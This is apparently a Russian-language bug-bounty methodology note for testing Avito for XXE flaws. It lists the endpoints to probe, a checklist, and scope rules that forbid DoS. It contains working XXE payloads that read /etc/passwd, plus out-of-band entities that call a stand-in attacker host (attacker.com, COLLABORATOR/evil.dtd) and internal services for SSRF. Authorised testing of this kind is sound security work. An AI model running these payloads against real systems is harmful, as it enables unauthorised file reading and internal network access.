# XXE — Avito

## Что ищем
XML External Entity — в SOAP, XML-API, загрузке файлов (SVG, DOCX, XLSX), SAML, RSS.

## Где искать
- SOAP-эндпоинты (старые интеграции, партнёрские API)
- Загрузка файлов: SVG (аватарки), DOCX/XLSX (резюме в HR-системах), XML-конфиги
- SAML-аутентификация
- RSS/Atom-фиды
- API с `Content-Type: application/xml` или `text/xml`
- HR-системы: импорт резюме, вакансий

## Типы атак
- **Классическая XXE:** чтение локальных файлов через `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- **Blind XXE:** out-of-band через `<!ENTITY % xxe SYSTEM "http://attacker.com/dtd">`
- **SSRF через XXE:** `SYSTEM "http://internal-service/"`
- **Billion Laughs (DoS):** **ЗАПРЕЩЕНО** правилами Avito
- **XInclude:** если прямой DOCTYPE заблокирован

## Базовый payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## Out-of-band (через Burp Collaborator / interactsh)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR/evil.dtd">
  %xxe;
]>
```

## Инструменты
- Burp Collaborator / interactsh
- XXEinjector
- OXML_XXE (Burp extension)

## Чек-лист
- [ ] Найти эндпоинты с XML (SOAP, загрузки, SAML)
- [ ] Подставить DOCTYPE с локальным файлом
- [ ] Проверить blind через OOB (Collaborator)
- [ ] Проверить SVG-загрузку с XXE
- [ ] Проверить DOCX/XLSX (распаковать, вставить в `[Content_Types].xml`)
- [ ] Проверить XInclude, если DOCTYPE отфильтрован

## Не делать
- Не использовать Billion Laughs / quadratic blowup (DoS)
- Не читать большие файлы (только PoC: `/etc/hostname`, первая строка `/etc/passwd`)
- Не атаковать внешние DTD на чужих серверах
